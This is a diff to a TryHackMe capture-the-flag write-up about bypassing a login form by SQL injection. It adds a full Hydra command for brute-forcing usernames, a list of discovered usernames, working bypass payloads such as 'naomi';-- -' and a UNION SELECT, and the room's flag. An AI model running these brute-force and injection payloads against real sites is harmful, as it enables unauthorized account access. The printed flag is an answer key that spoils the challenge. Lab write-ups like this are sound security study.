@@ -66,20 +66,83 @@ The flag has been destroyed due to our injection making it's way to a ```DELETE`
 
 Instead of trying to return every row with ```test' OR 1 = 1-- -``` and hoping we're logged into the account of the user in the first row we can use a SQL injection like ```test'; -- -``` or ```test' AND 1 = 1 -- -```. The problem with this safer alternative is that we need a valid username. So our next step is to enumerate possible usernames using a tool like [Hydra](https://www.kali.org/tools/hydra/ "Kali Linux Documentation For Hydra").
 
-The syntax for bruteforcing usernames with Hydra on a login form that uses ```POST``` requests is the following:
+Before we can craft the Hydra command we'll need the following:
 
-```hydra -L /path/to/wordlist -p testing IP_ADDRESS -s 80 http-post-form "/index.php:username=^USER^&password=^PASS^":"Invalid username and password."```
+* [Username Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt "Daniel Miessler's Usernames Wordlist On GitHub")
 
-Breakdown of above command:
+* Name of the page the form is submitted to.
 
-* ```-L /path/to/wordlist``` - .
+* Form method.
+
+* Input names for username/password.
+
+* Error message that appears when a username AND password are incorrect.
+
+All of these, with the exception of the wordlist and error message, can be found by viewing the forms source code.
+
+```html
+<div id="login">
+    <h1>Login</h1>
+    <form action="/" method="POST">
+        <label for="username">Username</label>
+        <input id="username" type="text" name="username">
+        <label for="password">Password</label>
+        <input id="password" type="password" name="password">
+        <input type="submit" value="Login">
+    </form>
+</div>
+```
+
+* Form Submission Page - ```/``` (Or ```index.php```).
+
+* Method - ```POST```.
+
+* Input Names - Password: ```password```, Username: ```username```.
+
+Now we can grab the error message by attempting to log in with dummy credentials such as ```test:test```.
+
+*  Error Message - ```Invalid username and password.```
+
+Now that we have everything we can craft the Hydra command.
+
+```hydra -L /path/to/wordlist -p INSERT_ANY_PASSWORD_HERE INSERT_IP_ADDRESS_HERE -s 80 http-post-form "/index.php:username=^USER^&password=^PASS^":"Invalid username and password."```
+
+After Hydra has finished running we should get the following valid usernames:
+
+* ```arnold```
+
+* ```karen```
+
+* ```kelly```
+
+* ```marcus```
+
+* ```martin```
+
+* ```naomi```
+
+* ```patrick```
+
+* ```sophia```
+
+* ```stuart```
+
+* ```veronica```
+
+Now that we have valid usernames we can bypass the login with either of the following payloads:
+
+* ```veronica' AND 1 = 1-- -```
+
+* ```naomi';-- -```
+
+And for some reason this also logs us in (with *ANY* username):
+
+* ```test' UNION SELECT null-- -```
+
+After bypassing the login page we'll be greeted with the following flag and message:
+
+```THM{aab02c6b76bb752456a54c80c2d6fb1e}```
 
 ![Success Page](./Assets/success.png "Success Page")
 
-THM{aab02c6b76bb752456a54c80c2d6fb1e}
-
-```test' UNION SELECT null-- -```
-
 [Back To Top](#lesson-learned "Jump To Top")
-
----
